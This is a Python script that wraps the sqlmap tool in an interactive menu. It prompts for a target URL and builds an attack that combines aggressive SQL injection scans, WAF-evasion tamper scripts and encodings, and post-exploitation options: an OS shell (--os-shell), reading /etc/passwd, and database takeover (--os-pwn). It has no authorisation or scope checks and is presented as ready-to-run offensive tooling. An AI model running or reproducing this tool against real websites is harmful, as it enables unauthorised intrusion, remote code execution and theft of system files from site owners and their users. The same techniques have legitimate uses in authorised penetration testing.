import os
import sys
import subprocess
import select
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ASCII Art Header
ASCII_ART = f"""
{Fore.CYAN}
▓█████▄  ██▀███   ██▓     ███▄ ▄███▓ ▄▄▄       ███▄    █ 
▒██▀ ██▌▓██ ▒ ██▒▓██▒    ▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ 
░██   █▌▓██ ░▄█ ▒▒██░    ▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒
░▓█▄   ▌▒██▀▀█▄  ▒██░    ▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
░▒████▓ ░██▓ ▒██▒░██████▒▒██▒   ░██▒ ▓█   ▓██▒▒██░   ▓██░
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
 ░ ▒  ▒   ░▒ ░ ▒░░ ░ ▒  ░░  ░      ░  ▒   ▒▒ ░░ ░░   ░ ▒░
 ░ ░  ░   ░░   ░   ░ ░   ░      ░     ░   ▒      ░   ░ ░ 
   ░       ░         ░  ░       ░         ░  ░         ░ 
 ░                                                      
{Style.RESET_ALL}
"""

# UI Configuration
EMOJI = {
    "target": "🎯",
    "scan": "🔍",
    "attack": "⚔️",
    "waf": "🛡️",
    "output": "📂",
    "warning": "⚠️",
    "success": "✅",
    "info": "ℹ️",
    "proxy": "🔗",
    "auth": "🔑"
}

COLOR = {
    "primary": Fore.CYAN,
    "secondary": Fore.YELLOW,
    "error": Fore.RED,
    "success": Fore.GREEN,
    "highlight": Fore.MAGENTA,
    "debug": Fore.BLUE,
    "banner": Fore.MAGENTA
}

class SqlmapFrontend:
    def __init__(self):
        print(ASCII_ART)
        print(f"{Fore.YELLOW}Credit to the Cyber Pantheon | Made by the CyberGhost{Style.RESET_ALL}\n")
        self.target = None
        self.current_command = ["sqlmap"]
        self.additional_options = ["--batch", "--random-agent"]
        self.verbosity = 1
        self.has_post = False

    def print_header(self, text):
        print(f"\n{COLOR['primary']}==== {text} ===={Style.RESET_ALL}")

    def format_output(self, line):
        """Colorize SQLMap output based on message type"""
        if "CRITICAL" in line:
            return f"{COLOR['error']}{EMOJI['warning']} {line}"
        elif "WARNING" in line:
            return f"{COLOR['secondary']}{EMOJI['warning']} {line}"
        elif "INFO" in line:
            return f"{COLOR['primary']}{EMOJI['info']} {line}"
        elif "PAYLOAD" in line:
            return f"{COLOR['highlight']}{line}"
        elif "DEBUG" in line and self.verbosity >= 6:
            return f"{COLOR['debug']}{line}"
        return line

    def execute_command(self):
        # Conflict resolution
        if "--chunked" in self.additional_options and not self.has_post:
            self.additional_options.append("--forms")
            print(f"{EMOJI['warning']} Added --forms to support chunked encoding")

        # Remove conflicting options
        if "--string" in self.additional_options and "--not-string" in self.additional_options:
            self.additional_options.remove("--not-string")
            print(f"{EMOJI['warning']} Removed conflicting option: --not-string")

        # Build final command with verbosity
        full_command = self.current_command + self.additional_options
        full_command.insert(1, f"-v{self.verbosity}")
        
        print(f"\n{EMOJI['success']} {COLOR['success']}Executing: {' '.join(full_command)}")

        try:
            process = subprocess.Popen(
                full_command,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=1,
                universal_newlines=True
            )

            while True:
                # Check for output using select
                rlist = [process.stdout, process.stderr]
                read_ready, _, _ = select.select(rlist, [], [], 1)

                for fd in read_ready:
                    if fd == process.stdout:
                        line = process.stdout.readline()
                        if line:
                            print(self.format_output(line.strip()))
                            # Check for interactive prompts
                            if "enter choice:" in line.lower():
                                user_input = input("\n[USER INPUT REQUIRED] ") + "\n"
                                process.stdin.write(user_input)
                                process.stdin.flush()
                    elif fd == process.stderr:
                        line = process.stderr.readline()
                        if line:
                            print(f"{COLOR['error']}{EMOJI['warning']} {line.strip()}")

                if process.poll() is not None:
                    break

            return process.poll()

        except Exception as e:
            print(f"{EMOJI['warning']} {COLOR['error']}Error: {str(e)}")
            return 1

    def configure_connection(self):
        self.print_header("Connection Configuration")
        proxy = input(f"{EMOJI['proxy']} Enter proxy (e.g., http://127.0.0.1:8080) [Enter to skip]: ")
        if proxy:
            self.additional_options.append(f"--proxy={proxy}")
        
        cookie = input(f"{EMOJI['auth']} Enter session cookies [Enter to skip]: ")
        if cookie:
            self.additional_options.append(f"--cookie={cookie}")

        self.additional_options.append(f"--delay={input(f'{EMOJI['info']} Enter delay between requests (default 2): ') or '2'}")

    def target_selection(self):
        self.print_header("Target Selection")
        self.target = input(f"{EMOJI['target']} Enter target URL/file: ")
        target_type = "-u" if "http" in self.target else "-m"
        self.current_command.append(f"{target_type} {self.target}")

    def discovery_phase(self):
        self.print_header("Advanced Discovery Configuration")
        print(f"{EMOJI['scan']} Choose discovery enhancements:")
        print("1. Smart crawl with form detection (--crawl --forms)")
        print("2. Full site enumeration (--wizard)")
        print("3. Aggressive scan (--level=5 --risk=3)")
        print("4. Skip discovery")
        
        choice = input(f"{EMOJI['info']} Your choice (1-4): ")
        
        if choice == "1":
            pages = input(f"{EMOJI['info']} Pages to crawl (default 3): ") or "3"
            self.additional_options.extend([
                f"--crawl={pages}",
                "--forms",
                "--parse-errors"
            ])
            self.has_post = True
        elif choice == "2":
            self.additional_options.append("--wizard")
        elif choice == "3":
            # Remove conflicting options
            if "--not-string" in self.additional_options:
                self.additional_options.remove("--not-string")
            self.additional_options.extend([
                "--level=5",
                "--risk=3",
                "--string=success"
            ])

    def injection_configuration(self):
        self.print_header("Injection Configuration")
        print(f"{EMOJI['attack']} Select injection techniques:")
        techniques = {
            "B": "Boolean-based blind",
            "E": "Error-based",
            "U": "UNION query",
            "S": "Stacked queries",
            "T": "Time-based blind",
            "Q": "Inline queries"
        }
        for k, v in techniques.items():
            print(f"{k}. {v}")
        tech_choice = input(f"{EMOJI['info']} Select techniques (comma-separated, default ALL): ") or "BEUSTQ"
        self.additional_options.append(f"--technique={tech_choice}")

    def waf_evasion(self):
        self.print_header("WAF Bypass Configuration")
        print(f"{EMOJI['waf']} Select evasion techniques:")
        print("1. Advanced tamper scripts")
        print("2. Hex encoding")
        print("3. Chunked transfer encoding")
        print("4. All of the above")
        
        choice = input(f"{EMOJI['info']} Your choice (1-4): ")
        tampers = []
        
        if choice in ["1", "4"]:
            tampers.extend([
                "space2comment",
                "randomcase",
                "chardoubleencode",
                "unionalltounion"
            ])
        if choice in ["2", "4"]:
            self.additional_options.append("--hex")
        if choice in ["3", "4"]:
            self.additional_options.append("--chunked")
        
        if tampers:
            self.additional_options.append(f"--tamper={','.join(tampers)}")

    def post_exploitation(self):
        self.print_header("Post-Exploitation Options")
        print(f"{EMOJI['attack']} Select post-exploit actions:")
        print("1. OS shell access (--os-shell)")
        print("2. File system access (--file-read/--file-write)")
        print("3. Database takeover (--os-pwn)")
        print("4. All of the above")
        
        choice = input(f"{EMOJI['info']} Your choice (1-4): ")
        
        if choice in ["1", "4"]:
            self.additional_options.append("--os-shell")
        if choice in ["2", "4"]:
            self.additional_options.append("--file-read=/etc/passwd")
        if choice in ["3", "4"]:
            self.additional_options.append("--os-pwn")

    def output_configuration(self):
        self.print_header("Output Configuration")
        self.verbosity = min(max(int(input(
            f"{EMOJI['info']} Enter verbosity level (0-6, default 1): ") or 1), 0), 6)
        
        path = input(f"{EMOJI['output']} Enter output directory [Enter to skip]: ")
        if path:
            self.additional_options.append(f"--output-dir={path}")

    def main_flow(self):
        try:
            self.target_selection()
            self.configure_connection()
            self.discovery_phase()
            self.injection_configuration()
            self.waf_evasion()
            self.post_exploitation()
            self.output_configuration()
            self.execute_command()
        except KeyboardInterrupt:
            print(f"\n{EMOJI['warning']} {COLOR['error']}Operation cancelled by user")

if __name__ == "__main__":
    SqlmapFrontend().main_flow()
